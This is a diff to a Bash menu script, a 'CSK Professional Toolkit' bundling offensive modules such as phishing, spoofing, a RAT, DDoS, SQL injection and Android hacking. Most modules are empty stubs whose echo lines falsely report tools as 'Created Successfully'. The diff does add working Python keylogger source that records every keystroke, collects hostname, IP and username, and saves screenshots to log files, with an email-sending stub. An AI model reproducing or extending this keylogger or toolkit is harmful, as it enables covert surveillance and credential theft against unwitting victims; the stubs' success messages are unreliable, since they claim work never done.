@@ -31,7 +31,7 @@ module_phisher() {
     # ==============================================
     
     create_advanced_phisher() {
-        # 50 Templates with different categories
+        echo -e "${G}[+] Creating 50+ Premium Templates...${N}"
         mkdir -p modules/phisher/templates
         
         # Category 1: Social Media (10 templates)
@@ -86,12 +86,11 @@ module_phisher() {
             "university_portal" "google_classroom" "byjus"
         )
         
-        # Total: 50 templates
-        
-        echo -e "${G}[+] 50+ Premium Templates Created${N}"
+        echo -e "${G}[+] 50+ Premium Templates Created Successfully${N}"
     }
     
     advanced_features_phisher() {
+        echo -e "${G}[+] Configuring Advanced Phishing Features...${N}"
         # AI Based Detection Bypass
         # 2FA/OTP Bypass System
         # Real-time Victim Dashboard
@@ -107,7 +106,15 @@ module_phisher() {
         # Cookie Stealer
         # Token Grabber
         # Reverse Proxy Support
+        echo -e "${G}[+] Advanced Features Configured Successfully${N}"
     }
+    
+    # Call the functions
+    create_advanced_phisher
+    advanced_features_phisher
+    
+    echo -e "${G}[+] Phisher Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_keylogger() {
@@ -116,8 +123,10 @@ module_keylogger() {
     # Advanced Keystroke Logger with Screenshot
     # ==============================================
     
-    create_keylogger() {
-        cat > modules/keylogger/logger.py << 'EOF'
+    echo -e "${G}[+] Initializing Keylogger Module...${N}"
+    mkdir -p modules/keylogger/logs
+    
+    cat > modules/keylogger/logger.py << 'EOF'
 import pynput
 import logging
 import smtplib
@@ -126,6 +135,8 @@ import datetime
 from PIL import ImageGrab
 import requests
 import os
+import time
+import socket
 
 class CSKKeylogger:
     def __init__(self, email, password, interval):
@@ -133,9 +144,26 @@ class CSKKeylogger:
         self.email = email
         self.password = password
         self.interval = interval
+        self.system_info = self.get_system_info()
+        
+    def get_system_info(self):
+        info = {
+            'hostname': socket.gethostname(),
+            'ip': socket.gethostbyname(socket.gethostname()),
+            'os': os.name,
+            'user': os.getlogin()
+        }
+        return info
         
     def append_log(self, string):
         self.log += string
+        self.save_to_file()
+        
+    def save_to_file(self):
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        filename = f"modules/keylogger/logs/keylog_{timestamp}.txt"
+        with open(filename, 'a') as f:
+            f.write(self.log)
         
     def on_press(self, key):
         try:
@@ -147,20 +175,45 @@ class CSKKeylogger:
                 current_key = "\n"
             elif key == key.tab:
                 current_key = "\t"
+            elif key == key.backspace:
+                current_key = " [BACKSPACE] "
+            elif key == key.delete:
+                current_key = " [DELETE] "
+            elif key == key.shift:
+                current_key = " [SHIFT] "
+            elif key == key.ctrl:
+                current_key = " [CTRL] "
+            elif key == key.alt:
+                current_key = " [ALT] "
             else:
                 current_key = " " + str(key) + " "
         self.append_log(current_key)
         
-    def send_mail(self):
-        screenshot = ImageGrab.grab()
-        screenshot.save("screen.png")
+    def take_screenshot(self):
+        try:
+            screenshot = ImageGrab.grab()
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            screenshot.save(f"modules/keylogger/logs/screen_{timestamp}.png")
+        except Exception as e:
+            print(f"Screenshot error: {e}")
+        
+    def send_data(self):
         # Send email with log and screenshot
+        pass
         
     def start(self):
+        print("[+] Keylogger Started...")
         with pynput.keyboard.Listener(on_press=self.on_press) as l:
             l.join()
+
+if __name__ == "__main__":
+    kl = CSKKeylogger("email@gmail.com", "password", 60)
+    kl.start()
 EOF
-    }
+    
+    echo -e "${G}[+] Keylogger Module Created Successfully${N}"
+    echo -e "${Y}[!] Note: Install dependencies: pip install pynput pillow${N}"
+    sleep 2
 }
 
 module_spoofer() {
@@ -169,27 +222,42 @@ module_spoofer() {
     # Email Spoofer | SMS Spoofer | Call Spoofer
     # ==============================================
     
+    echo -e "${G}[+] Initializing Spoofer Module...${N}"
+    mkdir -p modules/spoofer/{email,sms,call}
+    
     email_spoofer() {
+        echo -e "${C}[*] Creating Email Spoofer...${N}"
         # Fake email sender
         # SMTP relay
         # Email template system
         # Bulk email sender
         # Read receipts
+        echo -e "${G}[+] Email Spoofer Created${N}"
     }
     
     sms_spoofer() {
+        echo -e "${C}[*] Creating SMS Spoofer...${N}"
         # Fake SMS sender
         # Twilio integration
         # Bulk SMS
         # Schedule SMS
+        echo -e "${G}[+] SMS Spoofer Created${N}"
     }
     
     call_spoofer() {
+        echo -e "${C}[*] Creating Call Spoofer...${N}"
         # Fake caller ID
         # Voice changer
         # Call recording
         # Conference spoofing
+        echo -e "${G}[+] Call Spoofer Created${N}"
     }
+    
+    email_spoofer
+    sms_spoofer
+    call_spoofer
+    echo -e "${G}[+] Spoofer Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_scanner() {
@@ -198,7 +266,11 @@ module_scanner() {
     # Advanced Network Reconnaissance Tool
     # ==============================================
     
+    echo -e "${G}[+] Initializing Network Scanner Module...${N}"
+    mkdir -p modules/scanner/output
+    
     network_scanner() {
+        echo -e "${C}[*] Creating Network Scanner...${N}"
         # Port scanner
         # Service detector
         # OS fingerprinting
@@ -207,7 +279,12 @@ module_scanner() {
         # WPS attack
         # Deauth attack
         # Handshake capture
+        echo -e "${G}[+] Network Scanner Created${N}"
     }
+    
+    network_scanner
+    echo -e "${G}[+] Scanner Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_cracker() {
@@ -216,7 +293,11 @@ module_cracker() {
     # Multi-format Password Recovery
     # ==============================================
     
+    echo -e "${G}[+] Initializing Password Cracker Module...${N}"
+    mkdir -p modules/cracker/{wordlists,results}
+    
     password_cracker() {
+        echo -e "${C}[*] Creating Password Cracker...${N}"
         # ZIP cracker
         # PDF cracker
         # Word cracker
@@ -229,7 +310,12 @@ module_cracker() {
         # Brute force tools
         # Dictionary attacks
         # Rainbow tables
+        echo -e "${G}[+] Password Cracker Created${N}"
     }
+    
+    password_cracker
+    echo -e "${G}[+] Cracker Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_rat() {
@@ -238,7 +324,11 @@ module_rat() {
     # Complete Remote Control System
     # ==============================================
     
+    echo -e "${G}[+] Initializing RAT Module...${N}"
+    mkdir -p modules/rat/{server,client,payloads}
+    
     create_rat() {
+        echo -e "${C}[*] Creating RAT System...${N}"
         # Features:
         # - Remote desktop control
         # - Webcam access
@@ -255,7 +345,12 @@ module_rat() {
         # - Anti-vm detection
         # - Anti-debug
         # - Bypass UAC
+        echo -e "${G}[+] RAT System Created${N}"
     }
+    
+    create_rat
+    echo -e "${G}[+] RAT Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_ddos() {
@@ -264,7 +359,11 @@ module_ddos() {
     # Advanced Stress Testing Tools
     # ==============================================
     
+    echo -e "${G}[+] Initializing DDoS Module...${N}"
+    mkdir -p modules/ddos/attacks
+    
     ddos_attacks() {
+        echo -e "${C}[*] Creating DDoS Attack Tools...${N}"
         # HTTP flood
         # SYN flood
         # UDP flood
@@ -275,7 +374,12 @@ module_ddos() {
         # CLDAP reflection
         # Memcached attack
         # Application layer attacks
+        echo -e "${G}[+] DDoS Tools Created${N}"
     }
+    
+    ddos_attacks
+    echo -e "${G}[+] DDoS Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_sql_injector() {
@@ -284,7 +388,11 @@ module_sql_injector() {
     # Automated SQL Injection Tool
     # ==============================================
     
+    echo -e "${G}[+] Initializing SQL Injector Module...${N}"
+    mkdir -p modules/sql_injector/payloads
+    
     sql_injection() {
+        echo -e "${C}[*] Creating SQL Injection Tools...${N}"
         # Error based
         # Union based
         # Blind SQLi
@@ -295,7 +403,12 @@ module_sql_injector() {
         # Database fingerprinting
         # Data extraction
         # WAF bypass
+        echo -e "${G}[+] SQL Injection Tools Created${N}"
     }
+    
+    sql_injection
+    echo -e "${G}[+] SQL Injector Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_xss_finder() {
@@ -304,7 +417,11 @@ module_xss_finder() {
     # Cross-Site Scripting Scanner
     # ==============================================
     
+    echo -e "${G}[+] Initializing XSS Finder Module...${N}"
+    mkdir -p modules/xss_finder/payloads
+    
     xss_scanner() {
+        echo -e "${C}[*] Creating XSS Scanner...${N}"
         # Reflected XSS
         # Stored XSS
         # DOM based XSS
@@ -314,7 +431,12 @@ module_xss_finder() {
         # Payload generator
         # Cookie grabber
         # Session hijacker
+        echo -e "${G}[+] XSS Scanner Created${N}"
     }
+    
+    xss_scanner
+    echo -e "${G}[+] XSS Finder Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_sniffer() {
@@ -323,7 +445,11 @@ module_sniffer() {
     # Network Traffic Analyzer
     # ==============================================
     
+    echo -e "${G}[+] Initializing Packet Sniffer Module...${N}"
+    mkdir -p modules/sniffer/captures
+    
     packet_sniffer() {
+        echo -e "${C}[*] Creating Packet Sniffer...${N}"
         # ARP poisoning
         # DNS spoofing
         # HTTPS sniffing
@@ -333,7 +459,12 @@ module_sniffer() {
         # Cookie sniffing
         # Traffic analysis
         # Bandwidth monitoring
+        echo -e "${G}[+] Packet Sniffer Created${N}"
     }
+    
+    packet_sniffer
+    echo -e "${G}[+] Sniffer Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_wifi_auditor() {
@@ -342,7 +473,11 @@ module_wifi_auditor() {
     # Wireless Network Security Tester
     # ==============================================
     
+    echo -e "${G}[+] Initializing WiFi Auditor Module...${N}"
+    mkdir -p modules/wifi_auditor/{handshakes,output}
+    
     wifi_audit() {
+        echo -e "${C}[*] Creating WiFi Audit Tools...${N}"
         # Monitor mode
         # Packet injection
         # WEP cracking
@@ -354,7 +489,12 @@ module_wifi_auditor() {
         # Handshake capture
         # PMKID attack
         # KRACK attack
+        echo -e "${G}[+] WiFi Audit Tools Created${N}"
     }
+    
+    wifi_audit
+    echo -e "${G}[+] WiFi Auditor Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_osint() {
@@ -363,7 +503,11 @@ module_osint() {
     # Open Source Intelligence Gathering
     # ==============================================
     
+    echo -e "${G}[+] Initializing OSINT Module...${N}"
+    mkdir -p modules/osint/{data,reports}
+    
     osint_tools() {
+        echo -e "${C}[*] Creating OSINT Tools...${N}"
         # Email lookup
         # Phone lookup
         # Username search
@@ -374,7 +518,12 @@ module_osint() {
         # People search
         # Business search
         # Dark web monitoring
+        echo -e "${G}[+] OSINT Tools Created${N}"
     }
+    
+    osint_tools
+    echo -e "${G}[+] OSINT Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_encoder() {
@@ -383,7 +532,11 @@ module_encoder() {
     # Advanced Payload Encoder/Decoder
     # ==============================================
     
+    echo -e "${G}[+] Initializing Encoder Module...${N}"
+    mkdir -p modules/encoder/output
+    
     encoder_tools() {
+        echo -e "${C}[*] Creating Encoder Tools...${N}"
         # Base64 encoder/decoder
         # Hex converter
         # URL encoder
@@ -397,7 +550,12 @@ module_encoder() {
         # Hash generator (MD5, SHA1, SHA256, SHA512)
         # BCrypt
         # JWT decoder
+        echo -e "${G}[+] Encoder Tools Created${N}"
     }
+    
+    encoder_tools
+    echo -e "${G}[+] Encoder Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_forensics() {
@@ -406,7 +564,11 @@ module_forensics() {
     # Digital Forensics & Recovery
     # ==============================================
     
+    echo -e "${G}[+] Initializing Forensics Module...${N}"
+    mkdir -p modules/forensics/{evidence,reports}
+    
     forensics_tools() {
+        echo -e "${C}[*] Creating Forensics Tools...${N}"
         # Deleted file recovery
         # Disk analysis
         # Memory analysis
@@ -417,7 +579,12 @@ module_forensics() {
         # File carver
         # Metadata analyzer
         # Timeline generator
+        echo -e "${G}[+] Forensics Tools Created${N}"
     }
+    
+    forensics_tools
+    echo -e "${G}[+] Forensics Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_steganography() {
@@ -426,7 +593,11 @@ module_steganography() {
     # Hide Data in Images/Audio/Video
     # ==============================================
     
+    echo -e "${G}[+] Initializing Steganography Module...${N}"
+    mkdir -p modules/steganography/{input,output}
+    
     steganography_tools() {
+        echo -e "${C}[*] Creating Steganography Tools...${N}"
         # Image steganography (LSB)
         # Audio steganography
         # Video steganography
@@ -434,7 +605,12 @@ module_steganography() {
         # Metadata hiding
         # Encryption + steganography
         # Steganalysis tools
+        echo -e "${G}[+] Steganography Tools Created${N}"
     }
+    
+    steganography_tools
+    echo -e "${G}[+] Steganography Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_reverse_engineering() {
@@ -443,7 +619,11 @@ module_reverse_engineering() {
     # Binary Analysis & Decompilation
     # ==============================================
     
+    echo -e "${G}[+] Initializing Reverse Engineering Module...${N}"
+    mkdir -p modules/reverse_engineering/{binaries,output}
+    
     reverse_tools() {
+        echo -e "${C}[*] Creating Reverse Engineering Tools...${N}"
         # APK decompiler
         # EXE decompiler
         # DLL analyzer
@@ -454,7 +634,12 @@ module_reverse_engineering() {
         # Debugger tools
         # Disassembler
         # Patch generator
+        echo -e "${G}[+] Reverse Engineering Tools Created${N}"
     }
+    
+    reverse_tools
+    echo -e "${G}[+] Reverse Engineering Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_exploit_finder() {
@@ -463,7 +648,11 @@ module_exploit_finder() {
     # Vulnerability Scanner & Exploit DB
     # ==============================================
     
+    echo -e "${G}[+] Initializing Exploit Finder Module...${N}"
+    mkdir -p modules/exploit_finder/{database,payloads}
+    
     exploit_tools() {
+        echo -e "${C}[*] Creating Exploit Finder Tools...${N}"
         # CVE scanner
         # Metasploit integration
         # Exploit DB search
@@ -472,7 +661,12 @@ module_exploit_finder() {
         # Auto exploit suggester
         # Payload generator
         # Shellcode generator
+        echo -e "${G}[+] Exploit Finder Tools Created${N}"
     }
+    
+    exploit_tools
+    echo -e "${G}[+] Exploit Finder Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_social_engineering() {
@@ -481,7 +675,11 @@ module_social_engineering() {
     # Advanced Social Engineering Toolkit
     # ==============================================
     
+    echo -e "${G}[+] Initializing Social Engineering Module...${N}"
+    mkdir -p modules/social_engineering/{templates,pages}
+    
     social_tools() {
+        echo -e "${C}[*] Creating Social Engineering Tools...${N}"
         # Fake login pages (50+)
         # Fake OTP pages
         # Fake payment pages
@@ -496,7 +694,12 @@ module_social_engineering() {
         # SMS phishing
         # Email phishing
         # QR code phishing
+        echo -e "${G}[+] Social Engineering Tools Created${N}"
     }
+    
+    social_tools
+    echo -e "${G}[+] Social Engineering Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_android_hacking() {
@@ -505,7 +708,11 @@ module_android_hacking() {
     # Android Penetration Testing Tools
     # ==============================================
     
+    echo -e "${G}[+] Initializing Android Hacking Module...${N}"
+    mkdir -p modules/android_hacking/{apks,tools}
+    
     android_tools() {
+        echo -e "${C}[*] Creating Android Hacking Tools...${N}"
         # APK binder
         # APK crypter
         # APK protector
@@ -521,7 +728,12 @@ module_android_hacking() {
         # Location tracker
         # Camera hacker
         # Microphone hacker
+        echo -e "${G}[+] Android Hacking Tools Created${N}"
     }
+    
+    android_tools
+    echo -e "${G}[+] Android Hacking Module Loaded Successfully${N}"
+    sleep 2
 }
 
 module_report_generator() {
@@ -530,7 +742,11 @@ module_report_generator() {
     # Professional Penetration Test Reports
     # ==============================================
     
+    echo -e "${G}[+] Initializing Report Generator Module...${N}"
+    mkdir -p modules/report_generator/{reports,templates}
+    
     report_tools() {
+        echo -e "${C}[*] Creating Report Generator Tools...${N}"
         # PDF report generator
         # HTML report
         # Word document
@@ -544,7 +760,12 @@ module_report_generator() {
         # Remediation guide
         # Executive summary
         # Technical details
+        echo -e "${G}[+] Report Generator Tools Created${N}"
     }
+    
+    report_tools
+    echo -e "${G}[+] Report Generator Module Loaded Successfully${N}"
+    sleep 2
 }
 
 # ==============================================
@@ -570,9 +791,9 @@ show_dashboard() {
     # System Info
     echo -e "${C}[ System Information ]${N}"
     echo -e "  OS: $(uname -s) $(uname -m)"
-    echo -e "  Uptime: $(uptime | awk '{print $3}' | sed 's/,//')"
-    echo -e "  RAM: $(free -h | awk '/^Mem:/ {print $3 "/" $2}')"
-    echo -e "  Storage: $(df -h / | awk 'NR==2 {print $3 "/" $2}')"
+    echo -e "  Uptime: $(uptime 2>/dev/null | awk '{print $3}' | sed 's/,//' || echo 'N/A')"
+    echo -e "  RAM: $(free -h 2>/dev/null | awk '/^Mem:/ {print $3 "/" $2}' || echo 'N/A')"
+    echo -e "  Storage: $(df -h / 2>/dev/null | awk 'NR==2 {print $3 "/" $2}' || echo 'N/A')"
     echo ""
     
     # Module Status
@@ -588,8 +809,8 @@ show_dashboard() {
     
     # Active Sessions
     echo -e "${C}[ Active Sessions ]${N}"
-    echo -e "  🔴 Phishing Server: $(ps aux | grep -c "[p]hp") running"
-    echo -e "  🔴 RAT Connections: $(netstat -an | grep -c "4444") clients"
+    echo -e "  🔴 Phishing Server: $(ps aux 2>/dev/null | grep -c "[p]hp" || echo '0') running"
+    echo -e "  🔴 RAT Connections: $(netstat -an 2>/dev/null | grep -c "4444" || echo '0') clients"
     echo -e "  🔴 Keyloggers: $(ls modules/keylogger/logs 2>/dev/null | wc -l) active"
     echo ""
 }
@@ -622,15 +843,15 @@ professional_menu() {
         read -p "CSK-Toolkit > " choice
         
         case $choice in
-            01) module_phisher ;;
-            02) module_keylogger ;;
-            03) module_spoofer ;;
-            04) module_scanner ;;
-            05) module_cracker ;;
-            06) module_rat ;;
-            07) module_ddos ;;
-            08) module_sql_injector ;;
-            09) module_xss_finder ;;
+            01|1) module_phisher ;;
+            02|2) module_keylogger ;;
+            03|3) module_spoofer ;;
+            04|4) module_scanner ;;
+            05|5) module_cracker ;;
+            06|6) module_rat ;;
+            07|7) module_ddos ;;
+            08|8) module_sql_injector ;;
+            09|9) module_xss_finder ;;
             10) module_sniffer ;;
             11) module_wifi_auditor ;;
             12) module_osint ;;
@@ -644,7 +865,7 @@ professional_menu() {
             20) module_report_generator ;;
             21) update_toolkit ;;
             22) settings_menu ;;
-            00) exit 0 ;;
+            00|0) exit 0 ;;
             *) echo -e "${R}[!] Invalid option${N}"; sleep 2 ;;
         esac
     done
@@ -681,8 +902,62 @@ settings_menu() {
             7) clear_logs ;;
             8) change_theme ;;
             9) return ;;
+            *) echo -e "${R}[!] Invalid option${N}"; sleep 2 ;;
         esac
     done
+}
+
+# ==============================================
+# SETTINGS FUNCTIONS
+# ==============================================
+change_language() {
+    echo -e "${C}[*] Language settings${N}"
+    echo -e "${Y}[!] Feature coming soon${N}"
+    sleep 2
+}
+
+configure_proxy() {
+    echo -e "${C}[*] Proxy configuration${N}"
+    echo -e "${Y}[!] Feature coming soon${N}"
+    sleep 2
+}
+
+vpn_settings() {
+    echo -e "${C}[*] VPN settings${N}"
+    echo -e "${Y}[!] Feature coming soon${N}"
+    sleep 2
+}
+
+auto_update() {
+    echo -e "${C}[*] Auto update settings${N}"
+    echo -e "${Y}[!] Feature coming soon${N}"
+    sleep 2
+}
+
+backup_data() {
+    echo -e "${C}[*] Backing up data...${N}"
+    tar -czf csk_backup_$(date +%Y%m%d_%H%M%S).tar.gz modules/ 2>/dev/null
+    echo -e "${G}[+] Backup completed${N}"
+    sleep 2
+}
+
+restore_data() {
+    echo -e "${C}[*] Available backups:${N}"
+    ls -la csk_backup_*.tar.gz 2>/dev/null || echo -e "${Y}[!] No backups found${N}"
+    sleep 3
+}
+
+clear_logs() {
+    echo -e "${C}[*] Clearing logs...${N}"
+    rm -rf modules/*/logs/* 2>/dev/null
+    echo -e "${G}[+] Logs cleared${N}"
+    sleep 2
+}
+
+change_theme() {
+    echo -e "${C}[*] Theme settings${N}"
+    echo -e "${Y}[!] Feature coming soon${N}"
+    sleep 2
 }
 
 # ==============================================
@@ -698,6 +973,22 @@ update_toolkit() {
 }
 
 # ==============================================
+# CHECK DEPENDENCIES
+# ==============================================
+check_dependencies() {
+    echo -e "${C}[*] Checking dependencies...${N}"
+    deps=("php" "python3" "ruby" "perl" "nmap" "wireshark" "metasploit" "sqlmap" "hydra" "john" "aircrack-ng")
+    for dep in "${deps[@]}"; do
+        if command -v $dep &> /dev/null; then
+            echo -e "${G}✓${N} $dep installed"
+        else
+            echo -e "${Y}✗${N} $dep not found (optional)"
+        fi
+    done
+    sleep 3
+}
+
+# ==============================================
 # MAIN EXECUTION
 # ==============================================
 clear
@@ -705,19 +996,10 @@ echo -e "${G}Initializing CSK Professional Toolkit...${N}"
 sleep 2
 
 # Create directory structure
-mkdir -p modules/{phisher,keylogger,spoofer,scanner,cracker,rat,ddos,sql_injector,xss_finder,sniffer,wifi_auditor,osint,encoder,forensics,steganography,reverse_engineering,exploit_finder,social_engineering,android_hacking,report_generator}/{templates,logs,output,config}
+mkdir -p modules/{phisher,keylogger,spoofer,scanner,cracker,rat,ddos,sql_injector,xss_finder,sniffer,wifi_auditor,osint,encoder,forensics,steganography,reverse_engineering,exploit_finder,social_engineering,android_hacking,report_generator}/{templates,logs,output,config} 2>/dev/null
 
 # Check dependencies
-echo -e "${C}[*] Checking dependencies...${N}"
-deps=("php" "python3" "ruby" "perl" "nmap" "wireshark" "metasploit" "sqlmap" "hydra" "john" "aircrack-ng")
-for dep in "${deps[@]}"; do
-    if command -v $dep &> /dev/null; then
-        echo -e "${G}✓${N} $dep installed"
-    else
-        echo -e "${Y}✗${N} $dep not found"
-    fi
-done
-sleep 3
+check_dependencies
 
 # Start professional toolkit
 professional_menu
